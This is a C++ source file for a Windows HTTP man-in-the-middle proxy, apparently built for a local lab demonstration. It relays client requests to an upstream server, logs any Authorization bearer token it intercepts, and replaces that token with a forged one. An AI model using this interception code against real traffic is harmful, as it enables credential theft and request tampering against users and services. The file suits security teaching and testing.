// mitm_http_proxy.cpp (Windows Final Fix)
// Compile: g++ mitm_http_proxy.cpp -o mitm_http_proxy -std=c++17 -lws2_32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include <sstream>
#include <algorithm>
#include <cstring>

// 連結 Winsock library (針對 Visual Studio 環境，MinGW 需在指令加 -lws2_32)
#pragma comment(lib, "ws2_32.lib")

using namespace std;

static const int BUFFER_SIZE = 8192;
static const string LOG_FILE = "mitm_log.txt";

void log_line(const string &s) {
    cout << s << endl;
    ofstream f(LOG_FILE, ios::app);
    if (f.is_open()) {
        f << s << "\n";
        f.close();
    }
}

void close_socket(SOCKET s) {
    closesocket(s);
}

string recv_until_double_crlf(SOCKET sock) {
    string acc;
    char buf[BUFFER_SIZE];
    while (true) {
        int r = recv(sock, buf, sizeof(buf), 0);
        if (r <= 0) break;
        acc.append(buf, buf + r);
        if (acc.find("\r\n\r\n") != string::npos) break;
    }
    return acc;
}

void parse_headers(const string &head_block, string &start_line, map<string,string> &headers_out) {
    headers_out.clear();
    stringstream ss(head_block);
    string line;
    bool first = true;
    while (getline(ss, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        if (first) {
            start_line = line;
            first = false;
        } else {
            auto pos = line.find(':');
            if (pos != string::npos) {
                string k = line.substr(0, pos);
                string v = line.substr(pos + 1);
                auto trim = [](string &s) {
                    size_t a = s.find_first_not_of(" \t");
                    size_t b = s.find_last_not_of(" \t");
                    if (a == string::npos) { s = ""; return; }
                    s = s.substr(a, b - a + 1);
                };
                trim(k); trim(v);
                string lk = k;
                transform(lk.begin(), lk.end(), lk.begin(), ::tolower);
                headers_out[lk] = v;
            }
        }
    }
}

string forward_to_upstream(const string &upstream_host, int upstream_port, const vector<char> &request_bytes) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return "";

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(upstream_port);
    inet_pton(AF_INET, upstream_host.c_str(), &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        log_line("[MITM] connect() failed to upstream");
        close_socket(sock);
        return "";
    }

    size_t sent = 0;
    while (sent < request_bytes.size()) {
        int n = send(sock, request_bytes.data() + sent, (int)(request_bytes.size() - sent), 0);
        if (n <= 0) break;
        sent += n;
    }

    vector<char> resp;
    char buf[BUFFER_SIZE];
    while (true) {
        int r = recv(sock, buf, sizeof(buf), 0);
        if (r <= 0) break;
        resp.insert(resp.end(), buf, buf + r);
        if (r < (int)sizeof(buf)) {
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }
    close_socket(sock);
    return string(resp.begin(), resp.end());
}

void modify_request_headers_for_demo(map<string,string> &headers) {
    if (headers.count("authorization")) {
        string orig = headers["authorization"];
        log_line("[MITM] Intercepted Token: " + orig);
        headers["authorization"] = "Bearer FORGED_BY_MITM_DEMO"; 
        log_line("[MITM] >>> Attack: Replaced Authorization header with FORGED token.");
    }
}

void handle_client(SOCKET client_sock, string client_addr, const string upstream_host, int upstream_port) {
    string header_block = recv_until_double_crlf(client_sock);
    if (header_block.empty()) { close_socket(client_sock); return; }

    size_t hdr_end = header_block.find("\r\n\r\n");
    string head = header_block.substr(0, hdr_end);
    string remainder = header_block.substr(hdr_end + 4);

    string request_line;
    map<string,string> req_headers;
    parse_headers(head + "\r\n", request_line, req_headers);

    log_line("[MITM] Request: " + request_line);

    modify_request_headers_for_demo(req_headers);

    string req_head_text = request_line + "\r\n";
    for (auto &p : req_headers) req_head_text += p.first + ": " + p.second + "\r\n";
    req_head_text += "\r\n";

    size_t content_length = 0;
    if (req_headers.count("content-length")) {
        content_length = stoul(req_headers["content-length"]);
    }

    vector<char> req_bytes;
    req_bytes.insert(req_bytes.end(), req_head_text.begin(), req_head_text.end());
    if (!remainder.empty()) req_bytes.insert(req_bytes.end(), remainder.begin(), remainder.end());

    while (req_bytes.size() < req_head_text.size() + content_length) {
        char buf[BUFFER_SIZE];
        int r = recv(client_sock, buf, sizeof(buf), 0);
        if (r <= 0) break;
        req_bytes.insert(req_bytes.end(), buf, buf + r);
    }

    string resp = forward_to_upstream(upstream_host, upstream_port, req_bytes);
    send(client_sock, resp.data(), (int)resp.size(), 0);
    close_socket(client_sock);
}

int main(int argc, char* argv[]) {

    // === 新增這一行：關閉 C++ 的輸出緩衝，讓 Python 能即時讀取 ===
    setvbuf(stdout, NULL, _IONBF, 0);
    // ==========================================================

    if (argc != 4) {
        cerr << "Usage: " << argv[0] << " <listen_port> <target_ip> <target_port>\n";
    }
    // Windows 需要初始化 Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed.\n";
        return 1;
    }

    int listen_port = 8888;
    string upstream_host = "127.0.0.1";
    int upstream_port = 5000;
    if (argc >= 2) listen_port = stoi(argv[1]);
    if (argc >= 3) upstream_host = argv[2];
    if (argc >= 4) upstream_port = stoi(argv[3]);

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv == INVALID_SOCKET) {
        cerr << "Socket creation failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    // [Fix 1] 這裡正確宣告變數 opt
    char opt = 1; 
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(listen_port);

    // [Fix 2] 使用 ::bind 強制呼叫全域 socket 函式，避免與 std::bind 衝突
    if (::bind(srv, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        cerr << "Bind failed: " << WSAGetLastError() << endl;
        close_socket(srv);
        WSACleanup();
        return 1;
    }
    if (listen(srv, 16) == SOCKET_ERROR) {
        cerr << "Listen failed\n";
        return 1;
    }

    log_line("[MITM] Proxy running on port " + to_string(listen_port) + " -> Target " + upstream_host + ":" + to_string(upstream_port));

    while (true) {
        struct sockaddr_in cli;
        int clen = sizeof(cli);
        SOCKET cs = accept(srv, (struct sockaddr*)&cli, &clen);
        if (cs == INVALID_SOCKET) continue;
        char cbuf[64];
        inet_ntop(AF_INET, &cli.sin_addr, cbuf, sizeof(cbuf));
        thread t(handle_client, cs, string(cbuf), upstream_host, upstream_port);
        t.detach();
    }
    
    close_socket(srv);
    WSACleanup();
    return 0;
}
